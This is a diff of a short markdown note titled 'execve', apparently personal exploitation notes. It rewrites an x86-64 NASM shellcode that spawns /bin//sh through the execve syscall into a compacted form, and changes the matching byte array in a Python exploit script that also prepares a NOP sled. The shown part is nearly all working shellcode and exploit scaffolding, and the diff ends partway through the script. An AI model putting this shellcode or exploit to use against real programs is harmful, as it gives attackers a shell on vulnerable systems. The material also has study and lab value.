@@ -1,27 +1,21 @@
 # execve
 
-- https://shell-storm.org/shellcode
-- https://www.exploit-db.com/shellcodes
+## nasm
 
 ```nasm
+section .text
 global _start
 _start:
-	xor rax, rax                ; '\0'
-	push rax
-	mov rax, 0x68732f2f6e69622f ; "/bin//sh"
-	push rax
-	push rsp
-	pop rdi                     ; arg1: "/bin//sh"
-	xor rsi, rsi                ; arg2: 0
-	xor rdx, rdx                ; arg3: 0
 	xor rax, rax
-	add rax, 59                 ; execve("/bin//sh", NULL, NULL)
+	push rax                    ; '\0'
+	mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
+	push rbx
+	push rsp
+	pop rdi                     ; arg1: "/bin//sh\0"
+	xor rsi, rsi                ; arg2: NULL
+	xor rdx, rdx                ; arg3: NULL
+	mov al, 59                  ; execve("/bin//sh", NULL, NULL);
 	syscall
-
-; nasm -o shellcode.o shellcode.nasm -f elf64
-; ld -o shellcode shellcode.o
-; objcopy -O binary -j .text shellcode shellcode.bin
-; xxd -i -n code ./shellcode.bin
 ```
 
 ## exploit code
@@ -32,9 +26,9 @@ _start:
 #!/usr/bin/env python3
 import sys
 shellcode = bytes([
-  0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
-  0x73, 0x68, 0x50, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48,
-  0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
+  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
+  0x73, 0x68, 0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
+  0x3b, 0x0f, 0x05
 ])
 nops = b'\x90'*32
 # canonial: 0x0000_0000_0000_0000 - 0x0000_7fff_ffff_ffff
